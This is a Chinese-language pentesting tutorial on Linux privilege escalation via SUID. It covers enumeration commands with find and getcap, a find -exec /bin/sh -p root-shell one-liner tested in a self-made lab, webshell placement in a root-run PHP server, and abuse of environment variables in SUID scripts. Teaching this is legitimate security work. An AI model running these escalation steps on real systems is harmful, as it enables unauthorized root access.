# SUID

SUID可以让调用者以文件拥有者的身份运行该文件, 当在渗透过程中发现带有其他用户SUID权限的可执行文件服务或进程时，可以利用存在错误的权限配置获取其他用户或ROOT的权限

## 可执行文件提权

```sh
find / -user root -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -type f -name '*.txt' 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
getcap -r / 2>/dev/null
```

![image-20220531145004731](../../../.vuepress/public/img/image-20220531145004731.png)

创建新的用户 `user1`，使用 Root用户给 find命令加上 SUID权限，当登陆 user1 查看该命令时，可执行文件所有者为 Root，当 `user1` 调用该命令时，实际调用身份为 `Root`

```sh
user1@i-v0nrmv9j:~$ ls /usr/bin/find -all
-rwsr-xr-x 1 root root 199304 Oct 31  2018 /usr/bin/find
```

 <a-alert type="success" message="" description="Linux 提权工具: https://gtfobins.github.io/" showIcon>
</a-alert>
<br/>



![image-20220531150723350](../../../.vuepress/public/img/image-20220531150723350.png)

```sh
find . -exec /bin/sh -p \; -quit
```

![image-20220531151918257](../../../.vuepress/public/img/image-20220531151918257.png)

## 服务相关提权

SUID权限与Web服务相关时, 这里以Root用户开启一个PHP Web服务器

![image-20220531152916676](../../../.vuepress/public/img/image-20220531152916676.png)

![image-20220531153303027](../../../.vuepress/public/img/image-20220531153303027.png)

这里的PHP Web服务由于是Root权限开启的进程，我们可以通过在该Web目录写入 Webshell 命令执行获取Root权限

![image-20220531153753534](../../../.vuepress/public/img/image-20220531153753534.png)

## 利用变量提权

部分脚本中存在获取系统变量来执行时，如果变量可控且为SUID，我们就可以通过该脚本获取Root权限

![image-20220531171136888](../../../.vuepress/public/img/image-20220531171136888.png)

这里简单编写了一个例子，使用 env 中的变量 cmd 来执行命令 /bin/sh 获取可交互 Shell `(真实渗透中只需要注意SUID权限的可执行脚本是否有可控ENV变量)`

![image-20220531171451027](../../../.vuepress/public/img/image-20220531171451027.png) 